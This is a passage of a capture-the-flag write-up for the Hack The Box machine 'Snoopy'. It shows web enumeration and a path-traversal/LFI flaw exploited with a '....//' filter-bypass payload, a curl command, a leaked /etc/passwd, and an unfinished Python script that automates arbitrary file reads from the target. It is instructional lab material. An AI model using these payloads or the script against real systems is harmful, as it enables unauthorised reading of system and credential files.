<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/1.png"/><br/><br/>
While reading the content of the web service, we are informed that we can download a "press release package" or a "recent announcement." It appears that these are files containing information about their product.<br/><br/>
Upon downloading the file, we notice that it makes a GET request to the <code>/download</code> section and is a ZIP file named <code>press_release.zip</code>:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">press_release</span><span class="p">.</span><span class="n">zip</span>
<span class="n">press_release</span><span class="p">.</span><span class="nl">zip</span><span class="p">:</span><span class="w"> </span><span class="n">Zip</span><span class="w"> </span><span class="n">archive</span><span class="w"> </span><span class="k">data</span><span class="p">,</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">v2</span><span class="mf">.0</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">extract</span><span class="p">,</span><span class="w"> </span><span class="n">compression</span><span class="w"> </span><span class="k">method</span><span class="o">=</span><span class="n">deflate</span>
</code></pre><br style="line-height: 0.5;"/></div>

Using the <code>7z</code> tool, we can inspect the archive:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="mi">7</span><span class="n">z</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="n">press_release</span><span class="p">.</span><span class="n">zip</span>

<span class="mi">7</span><span class="o">-</span><span class="n">Zip</span><span class="w"> </span><span class="o">[</span><span class="n">64</span><span class="o">]</span><span class="w"> </span><span class="mf">16.02</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">1999</span><span class="o">-</span><span class="mi">2016</span><span class="w"> </span><span class="n">Igor</span><span class="w"> </span><span class="n">Pavlov</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">21</span>
<span class="n">p7zip</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mf">16.02</span><span class="w"> </span><span class="p">(</span><span class="n">locale</span><span class="o">=</span><span class="n">C</span><span class="p">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span><span class="n">Utf16</span><span class="o">=</span><span class="k">on</span><span class="p">,</span><span class="n">HugeFiles</span><span class="o">=</span><span class="k">on</span><span class="p">,</span><span class="mi">64</span><span class="w"> </span><span class="n">bits</span><span class="p">,</span><span class="mi">4</span><span class="w"> </span><span class="n">CPUs</span><span class="w"> </span><span class="n">AMD</span><span class="w"> </span><span class="n">A8</span><span class="o">-</span><span class="mi">7600</span><span class="w"> </span><span class="n">Radeon</span><span class="w"> </span><span class="n">R7</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="k">Compute</span><span class="w"> </span><span class="n">Cores</span><span class="w"> </span><span class="mi">4</span><span class="n">C</span><span class="o">+</span><span class="mi">6</span><span class="n">G</span><span class="w">   </span><span class="p">(</span><span class="mi">630</span><span class="n">F01</span><span class="p">),</span><span class="n">ASM</span><span class="p">,</span><span class="n">AES</span><span class="o">-</span><span class="n">NI</span><span class="p">)</span>

<span class="n">Scanning</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">drive</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">archives</span><span class="p">:</span>
<span class="mi">1</span><span class="w"> </span><span class="k">file</span><span class="p">,</span><span class="w"> </span><span class="mi">11363570</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="p">(</span><span class="mi">11</span><span class="w"> </span><span class="n">MiB</span><span class="p">)</span>

<span class="n">Listing</span><span class="w"> </span><span class="nl">archive</span><span class="p">:</span><span class="w"> </span><span class="n">press_release</span><span class="p">.</span><span class="n">zip</span>

<span class="o">--</span>
<span class="k">Path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">press_release</span><span class="p">.</span><span class="n">zip</span>
<span class="n">Type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">zip</span>
<span class="n">Physical</span><span class="w"> </span><span class="k">Size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">11363570</span>

<span class="w">   </span><span class="nc">Date</span><span class="w">      </span><span class="nc">Time</span><span class="w">    </span><span class="n">Attr</span><span class="w">         </span><span class="k">Size</span><span class="w">   </span><span class="n">Compressed</span><span class="w">  </span><span class="n">Name</span>
<span class="o">-------------------</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">------------</span><span class="w"> </span><span class="o">------------</span><span class="w">  </span><span class="o">------------------------</span>
<span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">20</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">52</span><span class="err">:</span><span class="mi">24</span><span class="w"> </span><span class="p">.....</span><span class="w">        </span><span class="mi">30732</span><span class="w">        </span><span class="mi">26969</span><span class="w">  </span><span class="n">announcement</span><span class="p">.</span><span class="n">pdf</span>
<span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">20</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">52</span><span class="err">:</span><span class="mi">36</span><span class="w"> </span><span class="p">.....</span><span class="w">     </span><span class="mi">11425609</span><span class="w">     </span><span class="mi">11336349</span><span class="w">  </span><span class="n">snoopysec_marketing</span><span class="p">.</span><span class="n">mp4</span>
<span class="o">-------------------</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">------------</span><span class="w"> </span><span class="o">------------</span><span class="w">  </span><span class="o">------------------------</span>
<span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">20</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">52</span><span class="err">:</span><span class="mi">36</span><span class="w">           </span><span class="mi">11456341</span><span class="w">     </span><span class="mi">11363318</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="n">files</span>
</code></pre><br style="line-height: 0.5;"/></div>

If we navigate to the "Contact" section, we are notified of the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/4.png"/><br/><br/>
This comment mentions that they are making changes to the DNS records and that their mail server (mailserver) is currently out of service.<br/><br/>
We can note that a subdomain <code>mail.snoopy.htb</code> is mentioned here. I will immediately add it to my <code>/etc/hosts</code> file.<br/><br/>
However, there's something peculiar here. If we recall the Zone Transfer attack, this subdomain was not returned in the response of the attack. It seems that this subdomain is not listed in the DNS records. This could be a crucial piece of information for us to proceed further on the machine.<br/><br/>
<h3><br>mm.snoopy.htb</br></h3><br>
Before continuing to investigate the main page, I will navigate to the subdomain <code>mm.snoopy.htb</code>. When the page loads, we can see that Mattermost is being used.<br/><br/>
Mattermost is an open-source enterprise communication platform that provides instant messaging, team collaboration, and chat tools similar to Slack. It enables organizations to create their own private and secure chat servers to facilitate internal communication, collaboration, and project management.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/2.png"/><br/><br/>
If we click on the "View in Browser" link, it allows us to access an authentication panel:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/3.png"/><br/><br/>
One of the first things to try on an authentication panel is to check if the service running behind it (in this case, Mattermost) defines default credentials during installation. In this case, I couldn't find much information online, so I assumed there are no default credentials.<br/><br/>
We also have an option to attempt to recover the password. In my case, since I don't have any known credentials, I tried entering random data:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/5.png"/><br/><br/>
It appears that behind the scenes, there is some SMTP request being made, as it mentions that if the account exists, an email will be sent to the email address you provided.<br/><br/>
<h3><br>LFI</br></h3><br>
Setting this aside, if we click on the second download link on the main webpage, something immediately catches our attention:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/18.png"/><br/><br/>
It appears that the <code>/download</code> section allows specifying a parameter via the GET method called <code>file</code>. This parameter seems to be pointing to a file on the system, which means we could attempt to read system files, i.e., perform an LFI (Local File Inclusion) if it's not sanitized.<br/><br/>
To inspect this more comfortably, I will use the <code>Burp Suite</code> tool to analyze the requests.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/19.png"/><br/><br/>
If we are correct, we could attempt to target a system file. The idea is that through the <code>Directory Path Traversal</code> technique, we can try to navigate through the system directories to reach the root and attempt to access files like <code>/etc/passwd</code><br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/20.png"/><br/><br/>
When sending the request, the web server does not return anything, so it's possible that it's sanitized. However, it might only be removing the <code>../</code> Path Traversal. Therefore, we can try using a payload like the following:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="err">GET /download?file=....//....//....//....//....//....//etc/passwd</span>
</code></pre><br style="line-height: 0.5;"/></div>

When the server removes the <code>../</code>, it will remove it only once, so once it's removed, it will look like this:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="err">GET /download?file=../../../../../../etc/passwd</span>
</code></pre><br style="line-height: 0.5;"/></div>

Allowing us, as a result, to access the system-level file.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/hard/snoopy/img/21.png"/><br/><br/>
This time, when we send the request, the server returns information. However, the problem is that it's in an unreadable format. This could be because the server is returning the information in a zip format, perhaps converting the file we specify in the <code>file</code> parameter into a compressed format.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">kali</span><span class="o">$</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="s2">"http://snoopy.htb/download?file=....//....//....//....//....//....//etc/passwd"</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">file</span><span class="o">.</span><span class="n">zip</span>
</code></pre><br style="line-height: 0.5;"/></div>

Upon sending the request, the <code>file.zip</code> is created in our current working directory as we specified. When checking the file type of <code>file.zip</code>, we can confirm that it is indeed a compressed file.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">file</span><span class="p">.</span><span class="n">zip</span>
<span class="k">file</span><span class="p">.</span><span class="nl">zip</span><span class="p">:</span><span class="w"> </span><span class="n">Zip</span><span class="w"> </span><span class="n">archive</span><span class="w"> </span><span class="k">data</span><span class="p">,</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">v2</span><span class="mf">.0</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">extract</span><span class="p">,</span><span class="w"> </span><span class="n">compression</span><span class="w"> </span><span class="k">method</span><span class="o">=</span><span class="n">deflate</span>
</code></pre><br style="line-height: 0.5;"/></div>

If we list the contents of the compressed file, we can see that we were correct, and the server compresses any file specified by the <code>file</code> parameter<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="c">elswix@kali$ 7z l file</span><span class="nt">.</span><span class="c">zip</span>


<span class="c">Listing archive: file</span><span class="nt">.</span><span class="c">zip</span>

<span class="nb">--</span>
<span class="c">Path = file</span><span class="nt">.</span><span class="c">zip</span>
<span class="c">Type = zip</span>
<span class="c">Physical Size = 796</span>

<span class="c">   Date      Time    Attr         Size   Compressed  Name</span>
<span class="nb">-------------------</span><span class="c"> </span><span class="nb">-----</span><span class="c"> </span><span class="nb">------------</span><span class="c"> </span><span class="nb">------------</span><span class="c">  </span><span class="nb">------------------------</span>
<span class="c">2023</span><span class="nb">-</span><span class="c">04</span><span class="nb">-</span><span class="c">25 19:38:58 </span><span class="nt">.....</span><span class="c">         1805          650  press_package/etc/passwd</span>
<span class="nb">-------------------</span><span class="c"> </span><span class="nb">-----</span><span class="c"> </span><span class="nb">------------</span><span class="c"> </span><span class="nb">------------</span><span class="c">  </span><span class="nb">------------------------</span>
<span class="c">2023</span><span class="nb">-</span><span class="c">04</span><span class="nb">-</span><span class="c">25 19:38:58               1805          650  1 files</span>
</code></pre><br style="line-height: 0.5;"/></div>

We decompress the file and attempt to display the contents of the <code>passwd</code> file:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">kali</span><span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">press_package</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span><span class="w"> </span><span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span><span class="w"> </span><span class="n">System</span><span class="w"> </span><span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Network</span><span class="w"> </span><span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">104</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Time</span><span class="w"> </span><span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">usbmux</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="n">usbmux</span><span class="w"> </span><span class="n">daemon</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">usbmux</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">cbrown</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">Charlie</span><span class="w"> </span><span class="n">Brown</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cbrown</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">sbrown</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="n">Sally</span><span class="w"> </span><span class="n">Brown</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sbrown</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">clamav</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1002</span><span class="p">:</span><span class="mi">1003</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">clamav</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lpelt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1003</span><span class="p">:</span><span class="mi">1004</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">lpelt</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">cschultz</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1004</span><span class="p">:</span><span class="mi">1005</span><span class="p">:</span><span class="n">Charles</span><span class="w"> </span><span class="n">Schultz</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cschultz</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">vgray</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1005</span><span class="p">:</span><span class="mi">1006</span><span class="p">:</span><span class="n">Violet</span><span class="w"> </span><span class="n">Gray</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vgray</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">bind</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">bind</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">998</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
</code></pre><br style="line-height: 0.5;"/></div>

We have successfully accessed system files, so we are exploiting a Local File Inclusion (LFI) vulnerability by abusing the Directory Path Traversal technique.<br/><br/>
Creating a Python script to automate this process is a good idea, as manually listing files can be cumbersome.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3 </span>

from<span class="w"> </span>subprocess<span class="w"> </span>import<span class="w"> </span>call<span class="w"> </span>
import<span class="w"> </span>requests,<span class="w"> </span>sys


<span class="c1"># Global </span>
<span class="nv">fileUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://snoopy.htb/download?file="</span><span class="w"> </span>


def<span class="w"> </span>getFile<span class="o">(</span>fileName<span class="o">)</span>:

<span class="w">    </span><span class="nv">getFileUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>fileUrl<span class="w"> </span>+<span class="w"> </span><span class="s2">"....//....//....//....//....//..../"</span><span class="w"> </span>+<span class="w"> </span>fileName<span class="w"> </span>
<span class="w">    </span><span class="nv">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span>getFileUrl<span class="o">)</span><span class="w"> </span>

<span class="w">    </span>with<span class="w"> </span>open<span class="o">(</span><span class="s2">"temp.zip"</span>,<span class="w"> </span><span class="s2">"wb"</span><span class="o">)</span><span class="w"> </span>as<span class="w"> </span>f:
<span class="w">        </span>f.write<span class="o">(</span>resp.content<span class="o">)</span>



def<span class="w"> </span>readFile<span class="o">(</span>fileName<span class="o">)</span>:

<span class="w">    </span><span class="nb">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>call<span class="o">(</span><span class="s2">"unzip temp.zip"</span>,<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>True<span class="o">)</span>

<span class="w">    </span><span class="nv">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>open<span class="o">(</span>f<span class="s2">"press_package{fileName}"</span>,<span class="w"> </span><span class="s2">"r"</span><span class="o">)</span>
<span class="w">    </span>print<span class="o">(</span>f.read<span class="o">())</span>



def<span class="w"> </span>removeTempFiles<span class="o">()</span>:

<span class="w">    </span><span class="nv">remove</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>call<span class="o">(</span><span class="s2">"rm -rf temp.zip"</span>,<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>True<span class="o">)</span>
<span class="w">    </span><span class="nv">remove</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>call<span class="o">(</span><span class="s2">"rm -rf press_package"</span>,<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>True<span class="o">)</span>


def<span class="w"> </span>main<span class="o">()</span>:

<span class="w">    </span><span class="nv">fileName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sys.argv<span class="o">[</span><span class="m">1</span><span class="o">]</span>
<span class="w">    </span>getFile<span class="o">(</span>fileName<span class="o">)</span>
<span class="w">    </span>readFile<span class="o">(</span>fileName<span class="o">)</span>
<span class="w">    </span>removeTempFiles<span class="o">()</span>



<span class="k">if</span><span class="w"> </span><span class="nv">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">'__main__'</span>:
